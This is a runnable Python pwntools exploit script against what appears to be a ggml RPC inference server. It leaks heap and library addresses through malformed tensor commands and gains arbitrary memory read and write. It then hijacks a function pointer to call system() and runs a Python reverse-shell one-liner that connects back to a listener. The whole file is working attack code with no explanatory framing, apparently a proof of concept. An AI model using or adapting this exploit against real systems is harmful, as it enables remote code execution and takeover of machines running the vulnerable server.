#!/usr/bin/env python3
from pwn import *
IP = 'localhost'
PORT = 50052
REVERSE_SHELL_IP = '127.0.0.1'
REVERSE_SHELL_PORT = 6666
CMD = f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{REVERSE_SHELL_IP}",{REVERSE_SHELL_PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' '''


'''
1 byte	|	8 bytes		|    ...
cmd     |	msg size	|  msg data
'''

# cmds
ALLOC_BUFFER = 0
SET_TENSOR   = 6
GET_TENSOR   = 7


io = remote('localhost',50052)

def send_cmd(cmd:int, buf:bytes):
    packet = b''
    packet += p8(cmd)
    packet += p64(len(buf))
    packet += buf
    io.send(packet)

def alloc_buf(size:int) -> int:
    send_cmd(ALLOC_BUFFER,p64(size))
    resp = io.recv(1024)

    heap_leak = u64(resp[0x8:0x10])
    return heap_leak


def arb_read(target_addr:int,valid_addr:int) -> int:
    tensor = flat({
        0x8: p32(0x0),
        12: p64(valid_addr),
        0x18: p32(0x41414141)*8,
        0xe0: p32(target_addr >> 32),

        0x128: p64(target_addr & 0x00000000ffffffff),
        0x130: p64(0x130)
    },filler = b'\x00',length=0x138)

    send_cmd(GET_TENSOR,tensor)
    resp = io.recv(1024)
    #log.info('leak ptrs ::')
    #for i in range (0,20):
    	#log.info(f'{hex(u64(resp[i*8:i*8+8]))}')

    return u64(resp[0x8:0x10])


def arb_write(target_addr:int,valid_addr:int,waht:bytes) -> int:
    tensor = flat({
        0x8: p32(28),
        12: p64(valid_addr),
        0x18: p32(0x41414141)*8,
        0xe0: p32(target_addr >> 32),

        0x128: p64(target_addr & 0x00000000ffffffff),
        0x130: waht
    },filler = b'\x00',length=0x140)

    send_cmd(SET_TENSOR,tensor)

    return 0

def exec_cmd(io: remote, cmd: str) -> None:
    with log.progress('Executing command') as p:
        # clear file
        arb_write(heap_leak, heap_leak, f'echo "">x\x00'.encode())
        arb_write(heap_leak+0x28, heap_leak, p64(system_addr)) # void         (*GGML_CALL set_tensor) (ggml_backend_buffer_t buffer,       struct ggml_tensor * tensor, const void * data, size_t offset, size_t size);
        arb_read(0xdeadbeefcafebabe, heap_leak) # call get_tensor to trigger the `jmp rax` 

        # write chars
        for c in cmd:
            p.status(f'Writing {c}')
            if c == '"':
                c = '\\"'
            arb_write(heap_leak, heap_leak, f'echo -n "{c}">>x\x00'.encode())
            arb_write(heap_leak+0x28, heap_leak, p64(system_addr)) # void         (*GGML_CALL set_tensor) (ggml_backend_buffer_t buffer,       struct ggml_tensor * tensor, const void * data, size_t offset, size_t size);
            arb_read(0xdeadbeefcafebabe, heap_leak) # call get_tensor to trigger the `jmp rax` 
        
        # exec command
        arb_write(heap_leak, heap_leak, b'sh ./x\x00')
        arb_write(heap_leak+0x28, heap_leak, p64(system_addr))
        arb_read(0xdeadbeefcafebabe, heap_leak)
    return None
    
alloc_buf(0x140)
io.close()

io = remote('localhost',50052)
heap_leak = alloc_buf(0x140)
log.info(f'heap_leak = {hex(heap_leak)}')

#arb_read(heap_leak-0x100,heap_leak)




set_tensor_addr = arb_read(heap_leak+0x20,heap_leak)
libgmml_base = set_tensor_addr - 0x567a0
log.info(f'set_tensor_addr:{hex(set_tensor_addr)}')
log.info(f'libgmml_base:{hex(libgmml_base)}')

puts_got_offset = 0xba988
puts_libc_offset = 0x80e50
libc_got_puts = arb_read(libgmml_base+puts_got_offset,heap_leak)
lib_base = libc_got_puts - puts_libc_offset
log.info(f'libc_got_puts:{hex(libc_got_puts)}')
log.info(f'lib_base:{hex(lib_base)}')

system_addr = lib_base + 0x50d70
log.info(f'system_addr:{hex(system_addr)}')

'''
arb_write(heap_leak,heap_leak,b'/bin/sh\x00')
arb_write(heap_leak+0x20,heap_leak,p64(system_addr))
arb_write(0xdeadbeefcafecafe,heap_leak,b'A'*8)
'''


#io.interactive()


   

 
exec_cmd(io,CMD)   
